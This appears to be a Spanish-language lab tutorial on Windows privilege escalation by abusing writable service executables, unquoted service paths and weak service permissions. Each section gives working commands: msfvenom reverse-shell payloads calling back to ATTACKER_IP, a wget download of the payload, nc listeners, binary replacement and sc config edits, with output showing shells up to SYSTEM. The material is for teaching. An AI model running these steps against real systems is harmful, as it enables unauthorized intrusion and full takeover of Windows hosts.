# Abusing Service Misconfigurations

### Windows Services

Los servicios de Windows son administrados por el **Administrador de control de servicios** (SCM). El SCM es un proceso encargado de gestionar el estado de los servicios según sea necesario, comprobar el estado actual de cualquier servicio determinado y, en general, proporcionar una forma de configurar los servicios.

Cada servicio en una máquina Windows tendrá un ejecutable asociado que el SCM ejecutará cada vez que se inicie un servicio. Es importante tener en cuenta que los ejecutables de servicio implementan funciones especiales para poder comunicarse con el SCM y, por lo tanto, ningún ejecutable puede iniciarse como servicio con éxito. Cada servicio también especifica la cuenta de usuario bajo la cual se ejecutará el servicio.

Para comprender mejor la estructura de un servicio, verifiquemos la configuración del servicio apphostsvc con el `sc qc`comando:

```shell-session
C:\> sc qc apphostsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: apphostsvc
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\system32\svchost.exe -k apphost
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Application Host Helper Service
        DEPENDENCIES       :
        SERVICE_START_NAME : localSystem
```

Aquí podemos ver que el ejecutable asociado se especifica a través del parámetro **BINARY\_PATH\_NAME** y la cuenta utilizada para ejecutar el servicio se muestra en el parámetro **SERVICE\_START\_NAME .**

Los servicios tienen una Lista de control de acceso discrecional (DACL), que indica quién tiene permiso para iniciar, detener, pausar, consultar el estado, consultar la configuración o reconfigurar el servicio, entre otros privilegios. El DACL se puede ver desde Process Hacker (disponible en el escritorio de su máquina):

<figure><img src="../../.gitbook/assets/20231009172828.png" alt=""><figcaption></figcaption></figure>

Todas las configuraciones de servicios se almacenan en el registro en `HKLM\SYSTEM\CurrentControlSet\Services\`:

<figure><img src="../../.gitbook/assets/20231009172853.png" alt=""><figcaption></figcaption></figure>

Existe una subclave para cada servicio del sistema. Nuevamente, podemos ver el ejecutable asociado en el valor **ImagePath** y la cuenta utilizada para iniciar el servicio en el valor **ObjectName** . Si se ha configurado una DACL para el servicio, se almacenará en una subclave llamada **Seguridad** . Como ya habrás adivinado, sólo los administradores pueden modificar dichas entradas de registro de forma predeterminada.

### Insecure Permissions on Service Executable

Si el ejecutable asociado con un servicio tiene permisos débiles que permiten a un atacante modificarlo o reemplazarlo, el atacante puede obtener los privilegios de la cuenta del servicio de manera trivial.

Para entender cómo funciona esto, veamos una vulnerabilidad encontrada en Splinterware System Scheduler. Para comenzar, consultaremos la configuración del servicio usando `sc`:

```shell-session
C:\> sc qc WindowsScheduler
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: windowsscheduler
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\PROGRA~2\SYSTEM~1\WService.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : System Scheduler Service
        DEPENDENCIES       :
        SERVICE_START_NAME : .\svcuser1
```

Podemos ver que el servicio instalado por el software vulnerable se ejecuta como svcuser1 y el ejecutable asociado al servicio está en formato `C:\Progra~2\System~1\WService.exe`. Luego procedemos a verificar los permisos del ejecutable:

```shell-session
C:\Users\thm-unpriv>icacls C:\PROGRA~2\SYSTEM~1\WService.exe
C:\PROGRA~2\SYSTEM~1\WService.exe Everyone:(I)(M)
                                  NT AUTHORITY\SYSTEM:(I)(F)
                                  BUILTIN\Administrators:(I)(F)
                                  BUILTIN\Users:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```

Y aquí tenemos algo interesante. El grupo `Everyone` tiene permisos de modificación (M) en el ejecutable del servicio. Esto significa que podemos simplemente sobrescribirlo con cualquier carga útil de nuestra preferencia y el servicio lo ejecutará con los privilegios de la cuenta de usuario configurada.

Generemos una carga útil de servicio exe usando msfvenom y la sirvamos a través de un servidor web Python:

```shell-session
user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe

user@attackerpc$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Luego podemos extraer el fichero malicioso desde la Powershell con el siguiente comando:

```shell-session
wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe
```

Una vez que el archivo malicioso está en el servidor de Windows, procedemos a reemplazar el ejecutable del servicio con nuestra carga útil. Dado que necesitamos otro usuario para ejecutar nuestro archivo malicioso, también queremos otorgar permisos completos al grupo `Everyone`:

```shell-session
C:\> cd C:\PROGRA~2\SYSTEM~1\

C:\PROGRA~2\SYSTEM~1> move WService.exe WService.exe.bkp
        1 file(s) moved.

C:\PROGRA~2\SYSTEM~1> move C:\Users\thm-unpriv\rev-svc.exe WService.exe
        1 file(s) moved.

C:\PROGRA~2\SYSTEM~1> icacls WService.exe /grant Everyone:F
        Successfully processed 1 files.
```

Ponemos a la escucha con `nc` en nuestra máquina atacante:

```shell-session
user@attackerpc$ nc -lvp 4445
```

Y finalmente, reinicie el servicio. Si bien en un escenario normal, probablemente tendría que esperar a que se reinicie el servicio, se le han asignado privilegios para reiniciar el servicio usted mismo para ahorrarle algo de tiempo. Utilice los siguientes comandos desde el símbolo del sistema cmd.exe:

```shell-session
C:\> sc stop windowsscheduler
C:\> sc start windowsscheduler
```

**Nota:** PowerShell tiene `sc`como alias `Set-Content`, por lo tanto, debe usarlo `sc.exe`para controlar los servicios con PowerShell de esta manera.

Como resultado, obtendrás una reverse shell con privilegios svcusr1:

```shell-session
user@attackerpc$ nc -lvp 4445
Listening on 0.0.0.0 4445
Connection received on 10.10.175.90 50649
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
wprivesc1\svcusr1
```

### Unquoted Service Paths

Cuando no podemos escribir directamente en los ejecutables del servicio , todavía existe la posibilidad de forzar a un servicio a ejecutar ejecutables arbitrarios mediante el uso de una característica bastante oscura.

Cuando se trabaja con servicios de Windows, ocurre un comportamiento muy particular cuando el servicio está configurado para apuntar a un ejecutable "sin comillas". Por si en caso con comillas queremos decir que la ruta del ejecutable asociado no está entre comillas correctamente para tener en cuenta los espacios en el comando.

Como ejemplo, veamos la diferencia entre dos servicios (estos servicios se utilizan sólo como ejemplos y es posible que no estén disponibles en su máquina). El primer servicio utilizará una cita adecuada para que el SCM sepa sin lugar a dudas que tiene que ejecutar el archivo binario señalado por `"C:\Program Files\RealVNC\VNC Server\vncserver.exe"`, seguido de los parámetros dados:

```shell-session
C:\> sc qc "vncserver"
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: vncserver
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : "C:\Program Files\RealVNC\VNC Server\vncserver.exe" -service
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : VNC Server
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```

Recuerde: PowerShell tiene `sc` como alias de `Set-Content`, por lo tanto, debe usar `sc.exe` para controlar los servicios si se encuentra en un mensaje de PowerShell. Ahora veamos otro servicio sin cotización adecuada:

```shell-session
C:\> sc qc "disk sorter enterprise"
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: disk sorter enterprise
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Disk Sorter Enterprise
        DEPENDENCIES       :
        SERVICE_START_NAME : .\svcusr2
```

Cuando el SCM intenta ejecutar el binario asociado, surge un problema. Dado que hay espacios en el nombre de la carpeta "Disk Sorter Enterprise", el comando se vuelve ambiguo y el SCM no sabe cuál de los siguientes está intentando ejecutar:

| Dominio                                                 | Argumento 1             | Argumento 2             |
| ------------------------------------------------------- | ----------------------- | ----------------------- |
| C:\Mis Programas\Disk.exe                               | Clasificador            | Empresa\bin\disksrs.exe |
| C:\Mis Programas\Disk Sorter.exe                        | Empresa\bin\disksrs.exe |                         |
| C:\Mis programas\Disk Sorter Enterprise\bin\disksrs.exe |                         |                         |

Esto tiene que ver con cómo el símbolo del sistema analiza un comando. Normalmente, cuando envía un comando, los espacios se utilizan como separadores de argumentos, a menos que formen parte de una cadena entrecomillada. Esto significa que la interpretación "correcta" del comando sin comillas sería ejecutar `C:\\MyPrograms\\Disk.exe`y tomar el resto como argumentos.

En lugar de fallar como probablemente debería, SCM intenta ayudar al usuario y comienza a buscar cada uno de los binarios en el orden que se muestra en la tabla:

1. Primero, busque `C:\\MyPrograms\\Disk.exe`. Si existe, el servicio ejecutará este ejecutable.
2. Si este último no existe, buscará `C:\\MyPrograms\\Disk Sorter.exe`. Si existe, el servicio ejecutará este ejecutable.
3. Si este último no existe, buscará `C:\\MyPrograms\\Disk Sorter Enterprise\\bin\\disksrs.exe`. Se espera que esta opción funcione correctamente y normalmente se ejecutará en una instalación predeterminada.

A partir de este comportamiento, el problema se hace evidente. Si un atacante crea cualquiera de los ejecutables que se buscan antes del ejecutable del servicio esperado, puede obligar al servicio a ejecutar un ejecutable arbitrario.

Si bien esto suena trivial, la mayoría de los ejecutables del servicio se instalarán de `C:\Program Files`forma `C:\Program Files (x86)`predeterminada, lo que los usuarios sin privilegios no pueden escribir. Esto evita que se explote cualquier servicio vulnerable. Hay excepciones a esta regla: - Algunos instaladores cambian los permisos de las carpetas instaladas, haciendo que los servicios sean vulnerables. - Un administrador podría decidir instalar los archivos binarios del servicio en una ruta no predeterminada. Si ese camino es escribible en todo el mundo, la vulnerabilidad puede explotarse.

En nuestro caso, el administrador instaló los archivos binarios del Disk Sorter en formato `c:\MyPrograms`. De forma predeterminada, hereda los permisos del `C:\`directorio, lo que permite a cualquier usuario crear archivos y carpetas en él. Podemos comprobar esto usando `icacls`:

```shell-session
C:\>icacls c:\MyPrograms
c:\MyPrograms NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
              BUILTIN\Administrators:(I)(OI)(CI)(F)
              BUILTIN\Users:(I)(OI)(CI)(RX)
              BUILTIN\Users:(I)(CI)(AD)
              BUILTIN\Users:(I)(CI)(WD)
              CREATOR OWNER:(I)(OI)(CI)(IO)(F)

Successfully processed 1 files; Failed processing 0 files
```

El `BUILTIN\\Users`grupo tiene privilegios **AD** y **WD** , lo que permite al usuario crear subdirectorios y archivos, respectivamente.

El proceso de crear un fichero malicioso de servicio .exe con msfvenom y transferirla al host de destino es el mismo que antes, así que siéntase libre de crear el siguiente fichero y cargarla en el servidor como antes. También iniciaremos un oyente para recibir el shell inverso cuando se ejecute:

```shell-session
user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4446 -f exe-service -o rev-svc2.exe

user@attackerpc$ nc -lvp 4446
```

Una vez que la carga útil esté en el servidor, muévala a cualquiera de las ubicaciones donde pueda ocurrir un secuestro. En este caso, moveremos nuestra carga útil a `C:\MyPrograms\Disk.exe`. También otorgaremos a todos permisos completos sobre el archivo para asegurarnos de que el servicio pueda ejecutarlo:

```shell-session
C:\> move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe

C:\> icacls C:\MyPrograms\Disk.exe /grant Everyone:F
        Successfully processed 1 files.
```

Una vez que se reinicia el servicio, su carga útil debería ejecutarse:

```shell-session
C:\> sc stop "disk sorter enterprise"
C:\> sc start "disk sorter enterprise"
```

Como resultado, obtendrás un shell inverso con privilegios svcusr2:

```shell-session
user@attackerpc$ nc -lvp 4446
Listening on 0.0.0.0 4446
Connection received on 10.10.175.90 50650
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
wprivesc1\svcusr2
```

### Insecure Service Permissions

Es posible que aún tenga una pequeña posibilidad de aprovechar un servicio si el DACL ejecutable del servicio está bien configurado y la ruta binaria del servicio está citada correctamente. Si el servicio DACL (no el DACL ejecutable del servicio) le permite modificar la configuración de un servicio, podrá reconfigurar el servicio. Esto le permitirá señalar cualquier ejecutable que necesite y ejecutarlo con cualquier cuenta que prefiera, incluido el propio SISTEMA.

Para verificar un servicio DACL desde la línea de comando, puede usar [Accesschk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) de la suite Sysinternals:

```shell-session
C:\tools\AccessChk> accesschk64.exe -qlc thmservice
  [0] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\SYSTEM
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_PAUSE_CONTINUE
        SERVICE_START
        SERVICE_STOP
        SERVICE_USER_DEFINED_CONTROL
        READ_CONTROL
  [4] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Users
        SERVICE_ALL_ACCESS
```

Aquí podemos ver que el `BUILTIN\\Users`grupo tiene el permiso SERVICE\_ALL\_ACCESS, lo que significa que cualquier usuario puede reconfigurar el servicio.

Antes de cambiar el servicio, construyamos otro shell inverso de servicio .exe e iniciemos un detector en la máquina del atacante:

```shell-session
user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe-service -o rev-svc3.exe

user@attackerpc$ nc -lvp 4447
```

Luego transferiremos el ejecutable del shell inverso a la máquina de destino y lo almacenaremos en `C:\Users\thm-unpriv\rev-svc3.exe`. Siéntete libre de usar wget para transferir tu ejecutable y moverlo a la ubicación deseada. Recuerde otorgar permisos a todos para ejecutar su carga útil:

```shell-session
C:\> icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F
```

Para cambiar el ejecutable asociado al servicio y la cuenta, podemos usar el siguiente comando (tenga en cuenta los espacios después de los signos iguales cuando use sc.exe):

```shell-session
C:\> sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj=LocalSystem
```

Tenga en cuenta que podemos usar cualquier cuenta para ejecutar el servicio. Elegimos LocalSystem porque es la cuenta con mayor privilegio disponible. Para activar nuestra carga útil, todo lo que queda es reiniciar el servicio:

```shell-session
C:\> sc stop THMService
C:\> sc start THMService
```

Y recibiremos un shell en la máquina de nuestro atacante con privilegios de SISTEMA:

```shell-session
user@attackerpc$ nc -lvp 4447
Listening on 0.0.0.0 4447
Connection received on 10.10.175.90 50650
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
NT AUTHORITY\SYSTEM
```
